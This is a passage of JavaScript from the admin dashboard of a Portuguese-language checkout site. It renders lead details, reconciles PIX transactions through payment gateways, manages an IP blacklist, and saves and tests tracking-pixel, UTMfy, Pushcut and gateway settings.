                { label: 'Frete ID', value: detail?.shipping?.id || payloadShipping?.id, mono: true },
                { label: 'Preco frete', value: detail?.shipping?.price ? formatCurrency(detail.shipping.price) : '-' },
                { label: 'Order bump', value: detail?.bump?.selected ? 'Selecionado' : 'Nao selecionado' },
                { label: 'Titulo do bump', value: payloadBump?.title, wide: true },
                { label: 'Preco order bump', value: detail?.bump?.price ? formatCurrency(detail.bump.price) : '-' },
                { label: 'PIX criado em', value: formatDateTime(detail?.payment?.pixCreatedAt) },
                { label: 'PIX pago em', value: formatDateTime(detail?.payment?.pixPaidAt) },
                { label: 'PIX estornado em', value: formatDateTime(detail?.payment?.pixRefundedAt) },
                { label: 'PIX recusado em', value: formatDateTime(detail?.payment?.pixRefusedAt) }
            ]);
        }

        if (leadDetailTracking) {
            leadDetailTracking.innerHTML = buildLeadFieldsHtml([
                { label: 'UTM Source', value: detail?.tracking?.utmSource },
                { label: 'UTM Medium', value: detail?.tracking?.utmMedium },
                { label: 'UTM Campaign', value: detail?.tracking?.utmCampaign, wide: true, accent: true },
                { label: 'UTM Term', value: detail?.tracking?.utmTerm },
                { label: 'UTM Content', value: detail?.tracking?.utmContent, wide: true },
                { label: 'SRC', value: payloadUtm?.src || payload?.src, mono: true },
                { label: 'SCK', value: payloadUtm?.sck || payload?.sck, mono: true, wide: true },
                { label: 'FBCLID', value: detail?.tracking?.fbclid, mono: true, wide: true },
                { label: 'GCLID', value: detail?.tracking?.gclid, mono: true, wide: true },
                { label: 'TTCLID', value: detail?.tracking?.ttclid, mono: true, wide: true },
                { label: 'Landing page', value: detail?.tracking?.landingPage, wide: true },
                { label: 'Referrer', value: detail?.tracking?.referrer, wide: true },
                { label: 'Source URL', value: detail?.tracking?.sourceUrl, wide: true, mono: true }
            ]);
        }

        if (leadDetailDevice) {
            leadDetailDevice.innerHTML = buildLeadFieldsHtml([
                { label: 'IP publico', value: detail?.device?.clientIp, mono: true, accent: true },
                { label: 'IP do metadata', value: metadata?.client_ip, mono: true },
                { label: 'Resumo dispositivo', value: detail?.device?.summary, accent: true },
                { label: 'Recebido em', value: formatDateTime(metadata?.received_at) },
                { label: 'Referrer do metadata', value: metadata?.referrer, wide: true },
                { label: 'User-Agent', value: detail?.device?.userAgent, mono: true, wide: true },
                { label: 'User-Agent metadata', value: metadata?.user_agent, mono: true, wide: true }
            ]);
        }

        if (leadDetailTechnical) {
            leadDetailTechnical.innerHTML = buildLeadFieldsHtml([
                { label: 'Payload event', value: payload?.event, mono: true },
                { label: 'Payload stage', value: payload?.stage, mono: true },
                { label: 'Source stage', value: payload?.sourceStage, mono: true },
                { label: 'Payload page', value: payload?.page, mono: true },
                { label: 'Gateway payload', value: payload?.gateway || payload?.paymentGateway || payload?.pixGateway, mono: true },
                { label: 'PIX status payload', value: payload?.pixStatus, mono: true },
                { label: 'PIX txid payload', value: payload?.pixTxid || payload?.pix?.idTransaction || payload?.pix?.txid, mono: true, wide: true },
                { label: 'Payload reward id', value: payloadReward?.id || payload?.rewardId, mono: true },
                { label: 'Payload reward nome', value: payloadReward?.name || payloadReward?.title || payload?.rewardName },
                { label: 'Payload shipping id', value: payloadShipping?.id || payload?.shippingId, mono: true },
                { label: 'Payload shipping nome', value: payloadShipping?.name || payload?.shippingName },
                { label: 'Payload shipping eta', value: payloadShipping?.eta },
                { label: 'Payload bump title', value: payloadBump?.title, wide: true },
                { label: 'Payload bump selected', value: payloadBump?.selected === true ? 'true' : (payloadBump?.selected === false ? 'false' : '-'), mono: true },
                { label: 'Payload upsell kind', value: payloadUpsell?.kind, mono: true },
                { label: 'Payload upsell title', value: payloadUpsell?.title, wide: true },
                { label: 'Source URL bruto', value: payload?.sourceUrl, mono: true, wide: true },
                { label: 'Payload amount bruto', value: payload?.amount, mono: true },
                { label: 'Metadata orderId', value: metadata?.orderId, mono: true },
                { label: 'Metadata sessionId', value: metadata?.sessionId, mono: true },
                { label: 'Payload referencia endereco', value: payloadExtra?.reference, wide: true },
                { label: 'Payload metadata UA', value: metadata?.user_agent, mono: true, wide: true }
            ]);
        }

        if (leadDetailPages) {
            leadDetailPages.innerHTML = pages.length
                ? pages.map((page, index) => `
                    <article class="lead-detail-page">
                        <div class="lead-detail-page-index">${index + 1}</div>
                        <div class="lead-detail-page-body">
                            <small>${escapeHtml(formatDetailValue(page?.page, 'etapa'))}</small>
                            <strong>${escapeHtml(formatDetailValue(page?.label))}</strong>
                            <span>${escapeHtml(formatDetailValue(page?.description))}</span>
                            <span>Primeiro registro: ${escapeHtml(formatDateTime(page?.createdAt))}</span>
                        </div>
                    </article>
                `).join('')
                : '<span class="admin-muted">Nenhuma pagina registrada para esta sessao.</span>';
        }

        if (leadDetailPayload) {
            leadDetailPayload.textContent = JSON.stringify(detail?.payload || {}, null, 2);
            leadDetailPayload.scrollTop = 0;
        }
        renderLeadTransactionLookup(detail?.transactionLookup || null);

        setLeadDetailModalVisible(true);
    };

    const openLeadDetail = async (sessionId) => {
        const cleanSessionId = String(sessionId || '').trim();
        if (!cleanSessionId || !leadDetailModal) return;

        if (leadDetailTitle) leadDetailTitle.textContent = 'Detalhes do lead';
        if (leadDetailSubtitle) leadDetailSubtitle.textContent = 'Carregando...';
        if (leadDetailMeta) leadDetailMeta.innerHTML = '';
        if (leadDetailSummary) leadDetailSummary.innerHTML = '';
        if (leadDetailOverview) leadDetailOverview.innerHTML = '';
        if (leadDetailIdentity) leadDetailIdentity.innerHTML = '';
        if (leadDetailAddress) leadDetailAddress.innerHTML = '';
        if (leadDetailPayment) leadDetailPayment.innerHTML = '';
        if (leadDetailTransactionStatus) leadDetailTransactionStatus.textContent = 'Nao consultada';
        if (leadDetailTransactionSummary) leadDetailTransactionSummary.innerHTML = '<div class="admin-muted">Nenhuma consulta feita ainda para esta transacao.</div>';
        if (leadDetailTransactionPayload) leadDetailTransactionPayload.textContent = 'Clique em "Consultar transacao" para consultar o gateway e sincronizar o status deste lead.';
        if (leadDetailTracking) leadDetailTracking.innerHTML = '';
        if (leadDetailDevice) leadDetailDevice.innerHTML = '';
        if (leadDetailTechnical) leadDetailTechnical.innerHTML = '';
        if (leadDetailPages) leadDetailPages.innerHTML = '<span class="admin-muted">Carregando...</span>';
        if (leadDetailPayload) leadDetailPayload.textContent = '{}';
        if (leadDetailBlockState) leadDetailBlockState.classList.add('hidden');
        if (leadDetailLookupStatus) leadDetailLookupStatus.textContent = 'Consulta individual pronta para sincronizar o lead.';
        setLeadDetailModalVisible(true);

        const res = await adminFetch(`/api/admin/leads/${encodeURIComponent(cleanSessionId)}`);
        const data = await res.json().catch(() => ({}));
        if (!res.ok || !data?.ok) {
            showToast(data?.error || 'Falha ao carregar detalhes do lead.', 'error');
            closeLeadDetailModal();
            return;
        }

        renderLeadDetail(data?.data || null);
    };

    const consultLeadTransaction = async () => {
        const detail = currentLeadDetail;
        const txid = String(detail?.payment?.pixTxid || '').trim();
        const gateway = String(detail?.payment?.gateway || '').trim();
        const sessionId = String(detail?.sessionId || '').trim();
        if (!txid || !gateway) {
            showToast('Este lead nao tem transacao valida para consulta.', 'error');
            return;
        }

        if (leadDetailLookupBtn) leadDetailLookupBtn.disabled = true;
        if (leadDetailLookupStatus) leadDetailLookupStatus.textContent = 'Consultando transacao no gateway...';

        const res = await adminFetch('/api/admin/pix-reconcile', {
            method: 'POST',
            body: JSON.stringify({
                txid,
                gateway,
                sessionId,
                mutate: 1
            })
        });
        const data = await res.json().catch(() => ({}));
        if (!currentLeadDetail || String(currentLeadDetail?.sessionId || '').trim() !== sessionId) {
            if (leadDetailLookupBtn) leadDetailLookupBtn.disabled = false;
            return;
        }

        if (!res.ok || data?.ok === false) {
            if (leadDetailLookupStatus) {
                leadDetailLookupStatus.textContent = data?.error || 'Falha ao consultar transacao.';
            }
            renderLeadTransactionLookup({
                ok: false,
                txid,
                gateway,
                statusCode: res.status || 0,
                detail: data?.error || data?.detail || 'request_error'
            });
            showToast('Falha ao consultar transacao.', 'error');
            if (leadDetailLookupBtn) leadDetailLookupBtn.disabled = false;
            return;
        }

        const item = data?.item || null;
        currentLeadDetail = {
            ...(currentLeadDetail || {}),
            transactionLookup: item
                ? { ...item, ok: item?.ok !== false }
                : {
                    ok: false,
                    txid,
                    gateway,
                    statusCode: 0,
                    detail: 'transaction_not_found'
                }
        };
        if (item?.ok !== false && Number(item?.updatedRows || 0) > 0) {
            const refreshedRes = await adminFetch(`/api/admin/leads/${encodeURIComponent(sessionId)}`);
            const refreshedData = await refreshedRes.json().catch(() => ({}));
            if (refreshedRes.ok && refreshedData?.ok && refreshedData?.data) {
                currentLeadDetail = {
                    ...refreshedData.data,
                    transactionLookup: currentLeadDetail.transactionLookup
                };
                renderLeadDetail(currentLeadDetail);
            } else {
                renderLeadTransactionLookup(currentLeadDetail.transactionLookup);
            }
        } else {
            renderLeadTransactionLookup(currentLeadDetail.transactionLookup);
        }
        if (leadDetailLookupStatus) {
            leadDetailLookupStatus.textContent = item
                ? item?.skippedRegression === true
                    ? `Consulta concluida: ${formatTransactionLookupState(item)}. O gateway respondeu sem promover o lead, entao o painel preservou o estado mais forte que ja existia.`
                    : Number(item?.updatedRows || 0) > 0
                        ? `Consulta concluida: ${formatTransactionLookupState(item)}. Lead sincronizado com sucesso.`
                        : `Consulta concluida: ${formatTransactionLookupState(item)}. Nenhuma alteracao foi necessaria neste lead.`
                : 'Nenhum detalhe retornado para essa transacao.';
        }
        if (data.warning) showToast(data.warning, 'error');
        if (item?.skippedRegression === true) {
            showToast('Transacao consultada. O painel preservou o estado mais avancado do lead.', 'success');
        } else if (Number(item?.updatedRows || 0) > 0) {
            showToast('Transacao consultada e lead sincronizado.', 'success');
        } else {
            showToast('Transacao consultada. Nenhuma alteracao foi necessaria.', 'success');
        }
        if (leadDetailLookupBtn) leadDetailLookupBtn.disabled = false;
    };

    const removeBlockedIp = async (ip, { silent = false } = {}) => {
        const cleanIp = String(ip || '').trim();
        if (!cleanIp) return false;

        const res = await adminFetch(`/api/admin/ip-blacklist?ip=${encodeURIComponent(cleanIp)}`, {
            method: 'DELETE'
        });
        const data = await res.json().catch(() => ({}));
        if (!res.ok) {
            if (!silent) showToast(data?.error || 'Falha ao remover IP da blacklist.', 'error');
            return false;
        }

        renderIpBlacklist(data?.entries || []);
        if (currentLeadDetail?.device?.clientIp === cleanIp) {
            currentLeadDetail.block = { blocked: false, entry: null };
            renderLeadDetail(currentLeadDetail);
        }
        if (!silent) showToast('IP removido da blacklist.', 'success');
        return true;
    };

    const blockCurrentLeadIp = async () => {
        const detail = currentLeadDetail;
        const ip = String(detail?.device?.clientIp || '').trim();
        const sessionId = String(detail?.sessionId || '').trim();
        if (!ip || !sessionId) {
            showToast('Nao existe IP valido para bloquear neste lead.', 'error');
            return;
        }

        const confirmed = window.confirm(`Tem certeza que deseja bloquear o IP ${ip}?`);
        if (!confirmed) return;

        const res = await adminFetch('/api/admin/ip-blacklist', {
            method: 'POST',
            body: JSON.stringify({
                sessionId,
                ip,
                reason: 'Bloqueio manual via admin'
            })
        });
        const data = await res.json().catch(() => ({}));
        if (!res.ok) {
            showToast(data?.error || 'Falha ao bloquear IP.', 'error');
            return;
        }

        renderIpBlacklist(data?.entries || []);
        currentLeadDetail.block = {
            blocked: true,
            entry: (data?.entries || []).find((entry) => String(entry?.ip || '').trim() === ip) || null
        };
        renderLeadDetail(currentLeadDetail);
        showToast('IP bloqueado com sucesso.', 'success');
    };

    const readDownloadFileName = (contentDisposition, fallbackName) => {
        const raw = String(contentDisposition || '').trim();
        if (!raw) return fallbackName;

        const utf8Match = raw.match(/filename\*=UTF-8''([^;]+)/i);
        if (utf8Match?.[1]) {
            try {
                return decodeURIComponent(utf8Match[1]);
            } catch (_error) {
                return utf8Match[1];
            }
        }

        const fileNameMatch = raw.match(/filename="?([^\";]+)"?/i);
        return fileNameMatch?.[1] || fallbackName;
    };

    const checkAuth = async () => {
        const res = await adminFetch('/api/admin/me');
        return res.ok;
    };

    const loadSettings = async () => {
        currentSettingsLoaded = false;
        currentSettingsRevision = '';
        currentSettingsStatus = 'loading';
        syncGatewaySwitches();
        const res = await adminFetch('/api/admin/settings');
        if (!res.ok) {
            const detail = await res.json().catch(() => ({}));
            const errorMessage = detail?.error || 'Nao foi possivel carregar as configuracoes do painel.';
            if (currentSettings && Object.keys(currentSettings).length > 0) {
                currentSettingsStatus = 'loaded';
                syncGatewaySwitches();
                if (saveStatus) saveStatus.textContent = 'Nao foi possivel atualizar as configuracoes. O ultimo estado carregado foi mantido.';
                showSettingsRetryModal(errorMessage);
                return;
            }
            currentSettingsStatus = 'unavailable';
            syncGatewaySwitches();
            if (saveStatus) saveStatus.textContent = errorMessage;
            showSettingsRetryModal(errorMessage);
            return;
        }
        const data = await res.json();
        currentSettingsLoaded = true;
        currentSettingsStatus = 'loaded';
        currentSettingsRevision = String(data?._meta?.updatedAt || '').trim();
        applyAdminSettingsToForm(data);
        writeCachedAdminSettings(data);
        hideSettingsRetryModal();
    };

    const saveSettings = async () => {
        if (!saveBtn) return;
        if (!currentSettingsLoaded || !currentSettingsRevision) {
            if (saveStatus) {
                saveStatus.textContent = 'Recarregue as configuracoes antes de salvar.';
                setTimeout(() => {
                    if (saveStatus) saveStatus.textContent = '';
                }, 3000);
            }
            return;
        }
        saveBtn.disabled = true;
        if (saveStatus) saveStatus.textContent = 'Salvando...';

        const payload = {
            _meta: {
                ...(currentSettings?._meta || {}),
                baseUpdatedAt: currentSettingsRevision
            }
        };

        if (hasPixelForm) {
            payload.pixel = {
                enabled: !!pixelEnabled?.checked,
                id: pixelId?.value?.trim() || '',
                backupId: pixelBackupId?.value?.trim() || '',
                capi: {
                    enabled: !!pixelCapiEnabled?.checked,
                    accessToken: pixelCapiToken?.value?.trim() || '',
                    backupAccessToken: pixelCapiBackupToken?.value?.trim() || '',
                    testEventCode: currentSettings?.pixel?.capi?.testEventCode || '',
                    backupTestEventCode: currentSettings?.pixel?.capi?.backupTestEventCode || ''
                },
                events: {
                    page_view: pixelEventPage?.checked !== false,
                    quiz_view: pixelEventQuiz?.checked !== false,
                    lead: pixelEventLead?.checked !== false,
                    purchase: pixelEventPurchase?.checked !== false,
                    checkout: pixelEventCheckout?.checked !== false
                }
            };
            payload.tiktokPixel = {
                enabled: !!tiktokPixelEnabled?.checked,
                id: tiktokPixelId?.value?.trim() || '',
                events: {
                    page_view: tiktokPixelEventPage?.checked !== false,
                    quiz_view: tiktokPixelEventQuiz?.checked !== false,
                    lead: tiktokPixelEventLead?.checked !== false,
                    purchase: tiktokPixelEventPurchase?.checked !== false,
                    checkout: tiktokPixelEventCheckout?.checked !== false
                }
            };
        }

        if (hasUtmfyForm) {
            payload.utmfy = {
                ...(currentSettings?.utmfy || {}),
                enabled: !!utmfyEnabled?.checked,
                endpoint: utmfyEndpoint?.value?.trim() || '',
                apiKey: utmfyApi?.value?.trim() || ''
            };
            const createdUrl = pushcutPixCreated?.value?.trim() || '';
            const confirmedUrl = pushcutPixConfirmed?.value?.trim() || '';
            payload.pushcut = {
                ...(currentSettings?.pushcut || {}),
                enabled: !!pushcutEnabled?.checked,
                pixCreatedUrl: createdUrl,
                pixCreatedUrl2: '',
                pixCreatedUrls: createdUrl ? [createdUrl] : [],
                pixConfirmedUrl: confirmedUrl,
                pixConfirmedUrl2: '',
                pixConfirmedUrls: confirmedUrl ? [confirmedUrl] : [],
                templates: {
                    ...(currentSettings?.pushcut?.templates || {}),
                    pixCreatedTitle: pushcutCreatedTitle?.value?.trim() || '',
                    pixCreatedMessage: pushcutCreatedMessage?.value?.trim() || '',
                    pixConfirmedTitle: pushcutConfirmedTitle?.value?.trim() || '',
                    pixConfirmedMessage: pushcutConfirmedMessage?.value?.trim() || ''
                }
            };
        }

        if (hasPaymentsForm) {
            const gatewayOrder = getGatewayOrderFromUi();
            const activeGateway = normalizeGatewayKey(gatewayOrder[0] || paymentsActiveGateway?.value || 'ghostspay');
            const currentGhostspay = getCurrentGatewaySettings('ghostspay');
            const currentSunize = getCurrentGatewaySettings('sunize');
            const currentParadise = getCurrentGatewaySettings('paradise');
            const currentAtomopay = getCurrentGatewaySettings('atomopay');
            payload.payments = {
                ...(currentSettings?.payments || {}),
                activeGateway,
                gatewayOrder,
                gateways: {
                    ...(currentSettings?.payments?.gateways || {}),
                    ghostspay: {
                        ...(currentSettings?.payments?.gateways?.ghostspay || {}),
                        enabled: readCheckboxSetting(gatewayGhostspayEnabled, currentGhostspay.enabled),
                        baseUrl: readInputSetting(gatewayGhostspayBaseUrl, currentGhostspay.baseUrl),
                        secretKey: readInputSetting(gatewayGhostspaySecretKey, currentGhostspay.secretKey),
                        companyId: readInputSetting(gatewayGhostspayCompanyId, currentGhostspay.companyId),
                        webhookToken: readInputSetting(gatewayGhostspayWebhookToken, currentGhostspay.webhookToken)
                    },
                    sunize: {
                        ...(currentSettings?.payments?.gateways?.sunize || {}),
                        enabled: readCheckboxSetting(gatewaySunizeEnabled, currentSunize.enabled),
                        baseUrl: readInputSetting(gatewaySunizeBaseUrl, currentSunize.baseUrl),
                        apiKey: readInputSetting(gatewaySunizeApiKey, currentSunize.apiKey),
                        apiSecret: readInputSetting(gatewaySunizeApiSecret, currentSunize.apiSecret)
                    },
                    paradise: {
                        ...(currentSettings?.payments?.gateways?.paradise || {}),
                        enabled: readCheckboxSetting(gatewayParadiseEnabled, currentParadise.enabled),
                        baseUrl: readInputSetting(gatewayParadiseBaseUrl, currentParadise.baseUrl),
                        apiKey: readInputSetting(gatewayParadiseApiKey, currentParadise.apiKey),
                        productHash: readInputSetting(gatewayParadiseProductHash, currentParadise.productHash),
                        orderbumpHash: readInputSetting(gatewayParadiseOrderbumpHash, currentParadise.orderbumpHash),
                        source: readInputSetting(gatewayParadiseSource, currentParadise.source),
                        description: readInputSetting(gatewayParadiseDescription, currentParadise.description)
                    },
                    atomopay: {
                        ...(currentSettings?.payments?.gateways?.atomopay || {}),
                        enabled: readCheckboxSetting(gatewayAtomopayEnabled, currentAtomopay.enabled),
                        baseUrl: readInputSetting(gatewayAtomopayBaseUrl, currentAtomopay.baseUrl),
                        apiToken: readInputSetting(gatewayAtomopayApiToken, currentAtomopay.apiToken),
                        offerHash: readInputSetting(gatewayAtomopayOfferHash, currentAtomopay.offerHash),
                        productHash: readInputSetting(gatewayAtomopayProductHash, currentAtomopay.productHash),
                        iofOfferHash: readInputSetting(gatewayAtomopayIofOfferHash, currentAtomopay.iofOfferHash),
                        iofProductHash: readInputSetting(gatewayAtomopayIofProductHash, currentAtomopay.iofProductHash),
                        correiosOfferHash: readInputSetting(gatewayAtomopayCorreiosOfferHash, currentAtomopay.correiosOfferHash),
                        correiosProductHash: readInputSetting(gatewayAtomopayCorreiosProductHash, currentAtomopay.correiosProductHash),
                        expressoOfferHash: readInputSetting(gatewayAtomopayExpressoOfferHash, currentAtomopay.expressoOfferHash),
                        expressoProductHash: readInputSetting(gatewayAtomopayExpressoProductHash, currentAtomopay.expressoProductHash),
                        webhookToken: readInputSetting(gatewayAtomopayWebhookToken, currentAtomopay.webhookToken)
                    }
                }
            };
        }

        if (hasFeatureForm) {
            payload.features = {
                ...(currentSettings?.features || {}),
                orderbump: featureOrderbump?.checked !== false
            };
        }

        const res = await adminFetch('/api/admin/settings', {
            method: 'POST',
            body: JSON.stringify(payload)
        });
        const result = await res.json().catch(() => ({}));

        if (saveStatus) {
            saveStatus.textContent = res.ok
                ? 'Configuracoes salvas.'
                : (result?.error || 'Falha ao salvar.');
            setTimeout(() => {
                if (saveStatus) saveStatus.textContent = '';
            }, 2500);
        }
        if (res.ok) {
            currentSettingsLoaded = false;
            currentSettingsRevision = String(result?.updatedAt || '').trim();
            await loadSettings();
        }
        if (res.ok && hasPaymentsForm) {
            const activeGateway = getPrimaryGatewayFromUi();
            setCurrentGatewayCard(activeGateway);
            syncGatewayOrderMeta();
            syncGatewaySwitches();
            if (metricActiveGateway) {
                metricActiveGateway.textContent = gatewayLabelForUi(activeGateway);
            }
        }
        saveBtn.disabled = false;
    };

    const runPixelTest = async () => {
        if (testPixelStatus) testPixelStatus.textContent = 'Enviando evento...';
        const pixel = await ensurePixelConfig(true);
        if (!pixel?.enabled || !pixel.id) {
            if (testPixelStatus) testPixelStatus.textContent = 'Pixel desativado ou sem ID.';
            showToast('Pixel nao configurado.', 'error');
            return;
        }
        loadFacebookPixel(pixel.id);
        firePixelEvent('Lead', { source: 'admin_test' });
        if (testPixelStatus) testPixelStatus.textContent = 'Evento Lead enviado.';
        showToast('Evento teste enviado ao Pixel.', 'success');
    };

    const runTikTokPixelTest = async () => {
        if (testTikTokPixelStatus) testTikTokPixelStatus.textContent = 'Enviando evento...';
        const pixel = await ensureTikTokPixelConfig(true);
        if (!pixel?.enabled || !pixel.id) {
            if (testTikTokPixelStatus) testTikTokPixelStatus.textContent = 'Pixel desativado ou sem code.';
            showToast('Pixel do TikTok nao configurado.', 'error');
            return;
        }
        loadTikTokPixel(pixel.id, { firePageView: pixel.events?.page_view !== false });
        fireTikTokPixelEvent('SubmitForm', {}, {
            event_id: `admin_test_${Date.now()}`
        });
        if (testTikTokPixelStatus) testTikTokPixelStatus.textContent = 'Evento SubmitForm enviado.';
        showToast('Evento teste enviado ao TikTok Pixel.', 'success');
    };

    const runUtmfyTest = async () => {
        if (!utmfyEnabled?.checked || !(utmfyEndpoint?.value || '').trim()) {
            if (testUtmfyStatus) testUtmfyStatus.textContent = 'Configure e salve o endpoint antes do teste.';
            showToast('Configure o UTMfy e salve.', 'error');
            return;
        }
        if (testUtmfyStatus) testUtmfyStatus.textContent = 'Enviando evento...';
        const res = await adminFetch('/api/admin/utmfy-test', { method: 'POST' });
        if (!res.ok) {
            const detail = await res.json().catch(() => ({}));
            const reason =
                detail?.detail?.reason ||
                detail?.reason ||
                detail?.detail?.detail ||
                detail?.detail ||
                detail?.error ||
                'Falha ao enviar.';
            if (testUtmfyStatus) testUtmfyStatus.textContent = reason;
            showToast('Falha ao enviar evento UTMfy.', 'error');
            return;
        }
        if (testUtmfyStatus) testUtmfyStatus.textContent = 'Evento teste enviado.';
        showToast('Evento teste enviado ao UTMfy.', 'success');
    };

    const runUtmfySale = async () => {
        if (!utmfyEnabled?.checked || !(utmfyEndpoint?.value || '').trim()) {
            if (saleUtmfyStatus) saleUtmfyStatus.textContent = 'Configure e salve o endpoint antes do envio.';
            showToast('Configure o UTMfy e salve.', 'error');
            return;
        }
        if (saleUtmfyStatus) saleUtmfyStatus.textContent = 'Enviando venda...';
        const res = await adminFetch('/api/admin/utmfy-sale', { method: 'POST' });
        if (!res.ok) {
            const detail = await res.json().catch(() => ({}));
            const reason =
                detail?.detail?.reason ||
                detail?.reason ||
                detail?.detail?.detail ||
                detail?.detail ||
                detail?.error ||
                'Falha ao enviar.';
            if (saleUtmfyStatus) saleUtmfyStatus.textContent = reason;
            showToast('Falha ao enviar venda UTMfy.', 'error');
            return;
        }
        if (saleUtmfyStatus) saleUtmfyStatus.textContent = 'Venda enviada.';
        showToast('Venda enviada ao UTMfy.', 'success');
    };

    const runPushcutTest = async () => {
        if (!pushcutEnabled?.checked) {
            if (testPushcutStatus) testPushcutStatus.textContent = 'Ative o Pushcut e salve antes do teste.';
            showToast('Ative o Pushcut e salve.', 'error');
            return;
        }
        const hasCreated = !!(pushcutPixCreated?.value || '').trim();
        const hasConfirmed = !!(pushcutPixConfirmed?.value || '').trim();
        if (!hasCreated && !hasConfirmed) {
            if (testPushcutStatus) testPushcutStatus.textContent = 'Informe ao menos uma URL de Pushcut.';
            showToast('Configure a URL de Pushcut.', 'error');
            return;
        }

        if (testPushcutStatus) testPushcutStatus.textContent = 'Enviando teste...';
        const res = await adminFetch('/api/admin/pushcut-test', { method: 'POST' });
        const data = await res.json().catch(() => ({}));

        if (!res.ok || !data?.ok) {
            const reason = data?.error || data?.detail?.reason || 'Falha ao testar Pushcut.';
            if (testPushcutStatus) testPushcutStatus.textContent = reason;
            showToast('Falha no teste do Pushcut.', 'error');
            return;
        }

        const createdOk = !!data?.results?.pix_created?.ok;
        const confirmedOk = !!data?.results?.pix_confirmed?.ok;
        const createdSent = Number(data?.results?.pix_created?.sent || (createdOk ? 1 : 0));
        const createdTotal = Number(data?.results?.pix_created?.total || (createdOk ? 1 : 0));
        const confirmedSent = Number(data?.results?.pix_confirmed?.sent || (confirmedOk ? 1 : 0));
        const confirmedTotal = Number(data?.results?.pix_confirmed?.total || (confirmedOk ? 1 : 0));
        if (testPushcutStatus) {
            testPushcutStatus.textContent = `PIX criado: ${createdSent}/${createdTotal} | PIX confirmado: ${confirmedSent}/${confirmedTotal}`;
        }
        showToast('Teste do Pushcut enviado.', 'success');
    };

    const runDispatchProcess = async () => {
        if (processDispatchStatus) processDispatchStatus.textContent = 'Processando fila...';
        const res = await adminFetch('/api/admin/dispatch-process', { method: 'POST' });
        const data = await res.json().catch(() => ({}));
        if (!res.ok || !data?.ok) {
            const reason = data?.error || data?.detail?.reason || 'Falha ao processar fila.';
            if (processDispatchStatus) processDispatchStatus.textContent = reason;
            showToast('Falha ao processar fila.', 'error');
            return;
        }
        if (processDispatchStatus) {
            processDispatchStatus.textContent = `Processados ${data.processed || 0}, sucesso ${data.succeeded || 0}, falha ${data.failed || 0}.`;
        }
        showToast('Fila processada com sucesso.', 'success');
    };

    const renderLeads = (rows, append = false) => {
        if (!leadsBody) return;
        if (!append) leadsBody.innerHTML = '';
        const esc = (value) => String(value ?? '')
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#39;');

        rows.forEach((row) => {
            const tr = document.createElement('tr');
            const sessionId = String(row.session_id || '').trim();
            const display = getLeadDisplayData(row);
            const paymentItems = Array.isArray(display?.payments) ? display.payments : [];
            const journeyLabel = formatDetailValue(display?.journey?.label);
            const journeyRaw = formatDetailValue(display?.journey?.raw || row.etapa);
            const chargeLabel = formatDetailValue(display?.charge?.label);
            const chargeOfferLabel = formatDetailValue(display?.charge?.offerLabel || chargeLabel);
            const rewardName = formatDetailValue(display?.selection?.reward?.name);
            const shippingName = formatDetailValue(display?.selection?.shipping?.name || row.frete);
            const bumpSelected = display?.selection?.bump?.selected === true && Number(display?.selection?.bump?.price || 0) > 0;
            const bumpTitle = formatDetailValue(display?.selection?.bump?.title, 'Seguro Bag');
            const currentAmount = Number(display?.charge?.amount ?? row.valor_total);
            const currentAmountText = Number.isFinite(currentAmount) ? formatCurrency(currentAmount) : '-';
            const txid = formatDetailValue(display?.charge?.txid || row.pix_txid, '');
            const campaign = String(row.utm_campaign_name || row.utm_campaign || '-').trim() || '-';
            const source = String(row.utm_source_label || row.utm_source || '-').trim() || '-';
            const term = String(row.utm_term_label || row.utm_term || '-').trim() || '-';
            const adset = String(row.utm_adset_name || row.utm_adset_label || row.utm_adset || '-').trim() || '-';
            const paymentPillsHtml = buildLeadStatusPillsHtml(paymentItems);
            const paymentBlockHtml = paymentPillsHtml
                ? `<div class="lead-stack"><div class="lead-stack__chips">${paymentPillsHtml}</div></div>`
                : '';
            const sessionNote = sessionId ? `Sessao ${formatLeadShortCode(sessionId, 10)}` : '-';
            const txidNote = txid ? `TXID ${formatLeadShortCode(txid, 10)}` : 'Sem TXID';
            const offerTags = [];
            if (bumpSelected) offerTags.push(`<span class="lead-chip lead-chip--success">${esc(bumpTitle)}</span>`);
            if (chargeLabel !== 'Front') offerTags.push(`<span class="lead-chip lead-chip--accent">${esc(chargeOfferLabel)}</span>`);
            tr.classList.add('admin-table-row--clickable');
            tr.tabIndex = 0;
            if (sessionId) tr.dataset.sessionId = sessionId;
            tr.innerHTML = `
                <td class="lead-cell lead-cell--lead">
                    <div class="lead-stack">
                        <strong class="lead-stack__title">${esc(row.nome || '-')}</strong>
                        <span class="lead-stack__meta">${esc(row.cpf && row.cpf !== '-' ? `CPF ${row.cpf}` : sessionNote)}</span>
                        ${row.cpf && row.cpf !== '-' ? `<span class="lead-stack__meta">${esc(sessionNote)}</span>` : ''}
                    </div>
                </td>
                <td class="lead-cell">
                    <div class="lead-stack">
                        <strong class="lead-stack__title">${esc(row.email || '-')}</strong>
                        <span class="lead-stack__meta">${esc(row.telefone || '-')}</span>
                    </div>
                </td>
                <td class="lead-cell">
                    <div class="lead-stack">
                        <div class="lead-stack__chips">
                            <span class="lead-chip lead-chip--channel">${esc(source)}</span>
                            <span class="lead-chip lead-chip--term">${esc(term)}</span>
                        </div>
                        <span class="lead-stack__meta" title="${esc(campaign)}">${esc(campaign)}</span>
                        <span class="lead-stack__meta" title="${esc(adset)}">${esc(adset)}</span>
                    </div>
                </td>
                <td class="lead-cell">
                    <div class="lead-stack">
                        <strong class="lead-stack__title">${esc(rewardName)}</strong>
                        <span class="lead-stack__meta">${esc(shippingName)}</span>
                        ${offerTags.length ? `<div class="lead-stack__chips">${offerTags.join('')}</div>` : ''}
                    </div>
                </td>
                <td class="lead-cell">
                    <div class="lead-stack">
                        <strong class="lead-stack__title">${esc(journeyLabel)}</strong>
                        <span class="lead-stack__meta">${esc(`Etapa salva: ${journeyRaw}`)}</span>
                        <span class="lead-stack__meta">${esc(`Ultimo evento: ${formatDetailValue(row.evento)}`)}</span>
                    </div>
                </td>
                <td class="lead-cell">${paymentBlockHtml}</td>
                <td class="lead-cell lead-cell--value">
                    <div class="lead-value">
                        <strong class="lead-value__primary">${esc(currentAmountText)}</strong>
                        <span class="lead-value__label">${esc(chargeOfferLabel)}</span>
                    </div>
                </td>
                <td class="lead-cell">
                    <div class="lead-stack">
                        <strong class="lead-stack__title">${esc(formatDateTime(row.event_time || row.updated_at))}</strong>
                        <span class="lead-stack__meta">${esc(row.gateway_label || '-')}</span>
